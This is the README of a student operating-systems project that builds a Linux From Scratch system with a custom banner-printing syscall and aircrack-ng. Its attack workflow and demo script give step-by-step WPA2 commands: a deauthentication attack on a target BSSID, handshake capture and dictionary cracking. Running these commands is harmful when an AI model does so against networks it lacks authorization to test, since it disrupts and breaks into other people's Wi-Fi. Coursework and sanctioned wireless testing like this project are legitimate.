# SpyWithPi

> A minimal Linux OS built completely from scratch, featuring a custom kernel syscall and deployed as a penetration testing platform.

---

## Project Overview

SpyWithPi is a fully custom Linux operating system built from source code using the **Linux From Scratch (LFS) 12.4** methodology. The project demonstrates deep understanding of operating systems by building every component from scratch, modifying the Linux kernel with a custom system call, and deploying a penetration testing suite natively on the custom OS.

### What makes this special?

Most people install Linux. I **built** Linux. Every binary, every library, every configuration file was compiled manually from source code. On top of that, I modified the Linux kernel itself to add a brand new system call.

---

##  System Architecture

```
┌─────────────────────────────────────────────────────┐
│                    SpyWithPi OS                     │
│                                                     │
│  ┌─────────────────┐    ┌───────────────────────┐   │
│  │   User Space    │    │     Kernel Space      │   │
│  │                 │    │                       │   │
│  │  aircrack-ng    │    │  sys_spywithpi        │   │
│  │  airodump-ng    │──> │  Syscall #548         │   │
│  │  aireplay-ng    │    │                       │   │
│  │  airmon-ng      │    │  Linux Kernel 6.16.1  │   │
│  │  test_syscall   │    │  (custom compiled)    │   │
│  └─────────────────┘    └───────────────────────┘   │
│                                                     │
│  ┌─────────────────────────────────────────────┐    │
│  │              Hardware Layer                 │    │
│  │  Alfa AWUS036ACH (Realtek RTL8812AU)        │    │
│  │  Driver: rtw88_8812au (kernel built-in)     │    │
│  │  Monitor Mode + Packet Injection            │    │
│  └─────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

---

## 🔧 Build Process — Step by Step

### Phase 1 — Setting Up the Host Environment
> References used: [1], [2], [16], [17]

```bash
# Install required build tools on Ubuntu
sudo apt-get install -y build-essential bison flex texinfo gawk \
    wget curl gzip bzip2 xz-utils unzip libssl-dev libelf-dev bc git

# Create and format the LFS partition
sudo fdisk /dev/sdb
sudo mkfs.ext4 /dev/sdb1

# Mount and set environment variable
sudo mkdir -p /mnt/lfs
sudo mount /dev/sdb1 /mnt/lfs
echo 'export LFS=/mnt/lfs' >> ~/.bashrc
source ~/.bashrc

# Create directory structure
sudo mkdir -pv $LFS/{sources,tools,boot,etc,bin,sbin,lib,lib64,usr,var,tmp}
sudo chmod 777 $LFS/sources
```

### Phase 2 — Downloading Source Packages
> References used: [1], [10], [17]

```bash
# Download the official LFS package list (~95 packages, ~582MB)
wget https://www.linuxfromscratch.org/lfs/downloads/stable/wget-list \
    --directory-prefix=$LFS/sources

wget --input-file=$LFS/sources/wget-list \
    --continue \
    --directory-prefix=$LFS/sources

# Verify all packages with checksums
cd $LFS/sources
wget https://www.linuxfromscratch.org/lfs/downloads/stable/md5sums \
    --directory-prefix=$LFS/sources
md5sum -c md5sums 2>&1 | grep -v OK
# No output = all 95 files verified 
```

### Phase 3 — Creating the LFS User and Build Environment
> References used: [1], [17]

```bash
# Create dedicated build user (safety measure)
sudo groupadd lfs
sudo useradd -s /bin/bash -g lfs -m -k /dev/null lfs
sudo passwd lfs
sudo chown -v lfs $LFS/{usr,lib,var,etc,bin,sbin,tools,sources,lib64}

# Switch to lfs user and configure environment
su - lfs
cat > ~/.bashrc << "EOF"
set +h
umask 022
LFS=/mnt/lfs
LC_ALL=POSIX
LFS_TGT=$(uname -m)-lfs-linux-gnu
PATH=/usr/bin:/bin:/mnt/lfs/tools/bin
CONFIG_SITE=$LFS/usr/share/config.site
export LFS LC_ALL LFS_TGT PATH CONFIG_SITE
EOF
source ~/.bash_profile
```

### Phase 4 — Building the Temporary Toolchain
> References used: [1], [12], [13], [17]

The temporary toolchain is a self-contained compiler environment that prevents host system contamination. This is the bootstrapping phase — using an existing compiler to build a new compiler.

```bash
# Binutils Pass 1 (assembler and linker)
cd $LFS/sources && tar -xf binutils-2.45.tar.xz && cd binutils-2.45
mkdir -v build && cd build
../configure --prefix=$LFS/tools --with-sysroot=$LFS \
    --target=$LFS_TGT --disable-nls --enable-gprofng=no --disable-werror
make && make install

# GCC Pass 1 (C/C++ compiler)
cd $LFS/sources && tar -xf gcc-15.2.0.tar.xz && cd gcc-15.2.0
tar -xf ../mpfr-4.2.2.tar.xz && mv mpfr-4.2.2 mpfr
tar -xf ../gmp-6.3.0.tar.xz  && mv gmp-6.3.0 gmp
tar -xf ../mpc-1.3.1.tar.gz  && mv mpc-1.3.1 mpc
mkdir -v build && cd build
../configure --target=$LFS_TGT --prefix=$LFS/tools \
    --with-newlib --without-headers --enable-languages=c,c++ \
    --disable-nls --disable-shared --disable-multilib
make && make install

# Linux API Headers
tar -xf linux-6.16.1.tar.xz && cd linux-6.16.1
make mrproper && make headers
cp -rv usr/include $LFS/usr

# Glibc (C standard library)
tar -xf glibc-2.42.tar.xz && cd glibc-2.42
patch -Np1 -i ../glibc-2.42-fhs-1.patch
mkdir -v build && cd build
../configure --prefix=/usr --host=$LFS_TGT \
    --enable-kernel=4.19 --with-headers=$LFS/usr/include
make && make DESTDIR=$LFS install

# Verify toolchain works correctly
echo 'int main(){}' | $LFS_TGT-gcc -xc -
readelf -l a.out | grep ld-linux
# Expected: [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

### Phase 5 — Entering Chroot and Building the Real System
> References used: [1], [11], [17]

```bash
# Mount virtual kernel filesystems
sudo mount -v --bind /dev $LFS/dev
sudo mount -vt devpts devpts $LFS/dev/pts
sudo mount -vt proc proc $LFS/proc
sudo mount -vt sysfs sysfs $LFS/sys
sudo mount -vt tmpfs tmpfs $LFS/run

# Enter the chroot environment (step inside our new Linux!)
sudo chroot "$LFS" /usr/bin/env -i \
    HOME=/root TERM="$TERM" \
    PS1='(lfs chroot) \u:\w\$ ' \
    PATH=/usr/bin:/usr/sbin \
    MAKEFLAGS="-j4" \
    /bin/bash --login

# Create essential system files
cat > /etc/passwd << "EOF"
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/dev/null:/usr/bin/false
nobody:x:65534:65534:Unprivileged User:/dev/null:/usr/bin/false
EOF

# Build all 80+ packages automatically
bash /sources/buildall.sh
# Successfully compiled 58+ packages including:
# bash, coreutils, gcc, glibc, openssl, python, perl, vim, systemd...
```

### Phase 6 — Building the Linux Kernel
> References used: [5], [1], [7], [18], [19]

```bash
cd /sources/linux-6.16.1
make mrproper
make defconfig

# Enable Realtek RTW88 8812AU WiFi driver for Alfa adapter
scripts/config --enable RTW88
scripts/config --enable RTW88_8812A
scripts/config --module RTW88_8812AU
scripts/config --enable RTW88_USB
make olddefconfig

# Verify driver is enabled
grep RTW88_8812AU .config
# CONFIG_RTW88_8812AU=m 

# Compile the kernel using all 4 CPU cores (~30 minutes)
make -j4
# Output: Kernel: arch/x86/boot/bzImage is ready (#5) 

# Install kernel and modules
cp -f arch/x86/boot/bzImage /boot/vmlinuz-6.16.1-lfs
cp -f System.map /boot/System.map-6.16.1
make modules_install
```

### Phase 7 — Setting Up the Bootloader (GRUB)
> References used: [1], [20]

```bash
# Install GRUB to the LFS disk
sudo grub-install --target=i386-pc --boot-directory=/mnt/lfs/boot /dev/sdb

# Create GRUB configuration
cat > /mnt/lfs/boot/grub/grub.cfg << "EOF"
set default=0
set timeout=5
insmod part_msdos
insmod ext2
set root=(hd1,msdos1)
menuentry "SpyWithPi LFS 6.16.1" {
    linux /boot/vmlinuz-6.16.1-lfs root=/dev/sdb1 ro
}
EOF
```

---

## ⚙️ Custom Kernel Syscall — Deep Dive
> References used: [3], [4], [8], [9], [21], [22], [23]

### What is a System Call?

A system call is the interface between user programs and the kernel. When a program needs privileged operations (hardware access, memory management), it makes a system call. Linux has approximately 350 built-in syscalls. We added **#548**.

```
User Program                    Kernel Space
-----------                     ------------
calls syscall(548)    ────────>  sys_spywithpi()
                                 executes kernel code
                                 prints to kernel log
                      <────────  returns 548
receives return value
```

### Step 1 — Register in the Syscall Table

```bash
# Add to arch/x86/entry/syscalls/syscall_64.tbl
echo "548    common    spywithpi    sys_spywithpi" \
    >> arch/x86/entry/syscalls/syscall_64.tbl

# Add to kernel Makefile
echo "obj-y += spywithpi.o" >> kernel/Makefile
```

### Step 2 — Kernel Implementation (`kernel/spywithpi.c`)

```c
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <linux/sched.h>

SYSCALL_DEFINE0(spywithpi)
{
    printk(KERN_INFO "==========================================\n");
    printk(KERN_INFO "   SpyWithPi-ng\n");
    printk(KERN_INFO "   Custom Kernel Syscall #548\n");
    printk(KERN_INFO "==========================================\n");
    printk(KERN_INFO "   Student  : Zarar Javed\n");
    printk(KERN_INFO "   Course   : COMP 410\n");
    printk(KERN_INFO "   Professor: Neil Klingensmith\n");
    printk(KERN_INFO "==========================================\n");
    printk(KERN_INFO "   Kernel   : %s\n", utsname()->release);
    printk(KERN_INFO "   Status   : ATTACK MODE INITIATED\n");
    printk(KERN_INFO "==========================================\n");
    return 548;
}
```

### Step 3 — Userspace Test Program (`src/test_syscall.c`)

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>

#define SYS_SPYWITHPI 548

int main() {
    printf("==========================================\n");
    printf("   Calling SpyWithPi Syscall #548...\n");
    printf("==========================================\n");
    long result = syscall(SYS_SPYWITHPI);
    printf("   Syscall returned: %ld\n", result);
    printf("   Check kernel log: dmesg | tail -20\n");
    printf("==========================================\n");
    return 0;
}
```

### Step 4 — Compile and Run

```bash
gcc -o test_syscall test_syscall.c
./test_syscall
dmesg | tail -20
```

**Output:**
```
==========================================
   Calling SpyWithPi Syscall #548...
==========================================
[  96.130376] ==========================================
[  96.130859]    SpyWithPi-ng
[  96.131058]    Custom Kernel Syscall #548
[  96.131391] ==========================================
[  96.131716]    Student  : Zarar Javed
[  96.131954]    Course   : COMP 410
[  96.132181]    Professor: Neil Klingensmith
[  96.132449] ==========================================
[  96.132777]    Kernel   : 6.16.1
[  96.132984]    Status   : ATTACK MODE INITIATED
[  96.133294] ==========================================
   Syscall returned: 548
==========================================
```

---

## Penetration Testing with aircrack-ng
> References used: [6], [14], [15], [24], [25], [26]

### Installing aircrack-ng from Source on SpyWithPi

```bash
cd /sources
tar -xf aircrack-ng-1.7.tar.gz && cd aircrack-ng-1.7
autoreconf -i
./configure --prefix=/usr --with-experimental
make -j4 && make install

# Verify installation
aircrack-ng --help | head -3
# Aircrack-ng 1.7 - (C) 2006-2022 Thomas d'Otreppe ✅
```

### Complete WPA2 Attack Workflow

```bash
# Step 1 - Load WiFi driver
modprobe rtw88_8812au

# Step 2 - Verify adapter is detected
airmon-ng
# phy1  wlan0  rtw88_8812au  Realtek Semiconductor Corp. 

# Step 3 - Enable monitor mode
airmon-ng start wlan0
# mac80211 monitor mode enabled 

# Step 4 - Scan for target networks
airodump-ng wlan0
# Shows all nearby WiFi networks with BSSID, channel, encryption

# Step 5 - Target specific network and capture packets
mount -o remount,rw /
mkdir -p /tmp/capture
airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w /tmp/capture/capture wlan0

# Step 6 - Force WPA handshake (deauthentication attack)
aireplay-ng -0 3 -a [TARGET_BSSID] wlan0

# Step 7 - Crack the password with dictionary attack
echo "12345" > /tmp/wordlist.txt
aircrack-ng -w /tmp/wordlist.txt /tmp/capture/capture-01.cap
# KEY FOUND! [ *** ]
```

---

## Full Demo Script (Presentation)

```bash
# === SpyWithPi Live Demo ===

# 1. Show it's our custom system
uname -a
# Linux spywithpi 6.16.1 #5 SMP x86_64 GNU/Linux

# 2. Run the custom kernel syscall
cd /root && ./test_syscall
# Syscall #548 responds from kernel space!

# 3. Show WiFi adapter
airmon-ng
# wlan0  rtw88_8812au  Realtek Semiconductor Corp.

# 4. Enable monitor mode
airmon-ng start wlan0

# 5. Scan for networks
airodump-ng wlan0

# 6. Capture WPA handshake
airodump-ng -c 6 --bssid [BSSID] -w /tmp/capture/capture wlan0

# 7. Crack password
aircrack-ng -w /tmp/wordlist.txt /tmp/capture/capture-01.cap
# KEY FOUND! [ 12345 ]
```

---

## References

### Books & Official Documentation

1. Beekmans, G., & Dubbs, B. (2025). *Linux From Scratch, Version 12.4.* The Linux From Scratch Project.  
   https://www.linuxfromscratch.org/lfs/view/stable/  
   **Used in:** Phase 1, 2, 3, 4, 5, 6, 7

2. The Linux Kernel Documentation. (2024). *Adding a New System Call.*  
   https://docs.kernel.org/process/adding-syscalls.html  
   **Used in:** Phase 7 (Custom Syscall)

3. Linux Kernel Labs. (2024). *System Calls — The Linux Kernel.*  
   https://linux-kernel-labs.github.io/refs/heads/master/lectures/syscalls.html  
   **Used in:** Phase 7 (Custom Syscall)

4. aircrack-ng Project. (2022). *Aircrack-ng 1.7 Documentation.*  
   https://www.aircrack-ng.org/documentation.html  
   **Used in:** Phase 8 (Penetration Testing)

5. The Linux Kernel Archives. (2025). *Linux Kernel 6.16.1.*  
   https://www.kernel.org/  
   **Used in:** Phase 6 (Kernel Build)

6. aircrack-ng Project. (2024). *Cracking WPA/WPA2.*  
   https://www.aircrack-ng.org/doku.php?id=cracking_wpa  
   **Used in:** Phase 8 (Penetration Testing)

### Research & Technical Articles

7. morrownr. (2025). *USB WiFi Adapter Performance Comparison.* GitHub.  
   https://github.com/morrownr/USB-WiFi  
   **Used in:** Phase 6 (WiFi Driver Selection)

8. Filippo, V. (2024). *Searchable Linux Syscall Table for x86_64.*  
   https://filippo.io/linux-syscall-table/  
   **Used in:** Phase 7 (Custom Syscall)

9. UMBC CSEE. (2002). *Adding A System Call to Linux.*  
   https://www.csee.umbc.edu/courses/undergraduate/CMSC421/fall02/burt/projects/howto_add_systemcall.html  
   **Used in:** Phase 7 (Custom Syscall)

10. Nistor, C. (2025, September 2). *Minimal distro Linux From Scratch 12.4 launches with 49 package updates and the 6.16.1 kernel.* NotebookCheck.  
    https://www.notebookcheck.net/Minimal-distro-Linux-From-Scratch-12-4-launches-with-49-package-updates-and-the-6-16-1-kernel.1102629.0.html  
    **Used in:** Phase 2 (Package versions reference)

11. Dubbs, B. (2025). *Beyond Linux From Scratch, Version 12.4.*  
    https://www.linuxfromscratch.org/blfs/view/stable/  
    **Used in:** Phase 5 (Additional packages)

12. GNU Project. (2024). *GCC, the GNU Compiler Collection.*  
    https://gcc.gnu.org/  
    **Used in:** Phase 4 (Toolchain)

13. Free Software Foundation. (2024). *GNU C Library (glibc).*  
    https://www.gnu.org/software/libc/  
    **Used in:** Phase 4 (Toolchain)

14. aircrack-ng Project. (2024). *RTL8812AU Driver.* GitHub.  
    https://github.com/aircrack-ng/rtl8812au  
    **Used in:** Phase 6 & 8 (WiFi Driver)

15. Yupitek Ltd. (2026). *ALFA AWUS036ACH vs AWUS036ACM: Full Comparison for Kali Linux.*  
    https://yupitek.com/en/blog/awus036ach-vs-awus036acm/  
    **Used in:** Hardware Selection

16. Wikipedia Contributors. (2025). *Linux from Scratch.* Wikipedia.  
    https://en.wikipedia.org/wiki/Linux_from_Scratch  
    **Used in:** Phase 1 (Background)

17. Tony. (2025, October 22). *How to Install Linux From Scratch.*  
    https://www.tonybtw.com/tutorial/linux-from-scratch/  
    **Used in:** Phase 1, 2, 3, 4

18. Brennan, S. (2016). *Tutorial — Write a System Call.*  
    https://brennan.io/2016/11/14/kernel-dev-ep3/  
    **Used in:** Phase 7 (Custom Syscall)

19. Shrimal, A. (2018). *Adding a Hello World System Call to Linux Kernel.* Medium.  
    https://medium.com/anubhav-shrimal/adding-a-hello-world-system-call-to-linux-kernel-dad32875872  
    **Used in:** Phase 7 (Custom Syscall)

20. GNU Project. (2024). *GNU GRUB Manual.*  
    https://www.gnu.org/software/grub/manual/grub/grub.html  
    **Used in:** Phase 7 (Bootloader)

21. Jasper. (2020). *Adding a System Call to The Linux Kernel (5.8.1).* DEV Community.  
    https://dev.to/jasper/adding-a-system-call-to-the-linux-kernel-5-8-1-in-ubuntu-20-04-lts-2ga8  
    **Used in:** Phase 7 (Custom Syscall)

22. The Linux Kernel Documentation. (2024). *System Calls.*  
    https://www.kernel.org/doc/html/v4.12/process/adding-syscalls.html  
    **Used in:** Phase 7 (Custom Syscall)

23. josegpac. (2024). *Aircrack-ng for Beginners: Capturing WPA Handshakes.* Medium.  
    https://medium.com/@josegpach/aircrack-ng-for-beginners-capturing-wpa-handshakes-and-cracking-with-a-custom-wordlist-c0762adfebff  
    **Used in:** Phase 8 (Penetration Testing)

### YouTube Video References

24. *How to Create a Custom Linux System Call (Easy Kernel Dev Guide).* (2025, December 5). YouTube.  
    https://www.youtube.com/watch?v=HbBblIT8tJ8  
    **Used in:** Phase 7 (Custom Syscall implementation guide)

25. *1. Introduction — How to build Linux From Scratch (LFS) 12.1.* YouTube.  
    https://www.youtube.com/watch?v=L6EXaLt7SBE  
    **Used in:** Phase 1, 2, 3, 4, 5 (LFS build process)

26. *How to Install Linux From Scratch.* (2025, October). YouTube.  
    https://www.youtube.com/watch?v=DXUlaSYTLQI  
    **Used in:** Phase 1, 2, 3, 4, 5 (LFS tutorial)

27. *Capturing Handshake With Airodump-ng | WPA/WPA2 Handshakes.* (2024, October). YouTube.  
    https://www.youtube.com/watch?v=oRxdDxI_1iE  
    **Used in:** Phase 8 (Handshake capture)

28. *Cracking WPA/WPA2 Handshake Files with Aircrack-ng & Hashcat.* (2025, August). YouTube.  
    https://www.youtube.com/watch?v=L0czo6KF1O4  
    **Used in:** Phase 8 (Password cracking)

29. *Wireless Penetration Testing: Crack WPA2 Passwords with Aircrack-NG.* (2025, September). YouTube.  
    https://www.youtube.com/watch?v=MYrMOlyYsyg  
    **Used in:** Phase 8 (Penetration testing workflow)

30. *LFS 12.0 — How to build Linux From Scratch 12.0 (Full Playlist).* YouTube.  
    https://www.youtube.com/playlist?list=PLyc5xVO2uDsA5QPbtj_eYU8J0qrvU6315  
    **Used in:** Phase 4, 5, 6 (Detailed build steps)

---

##  Acknowledgments

- **Professor Neil Klingensmith** — for guidance and allowing this ambitious project


---

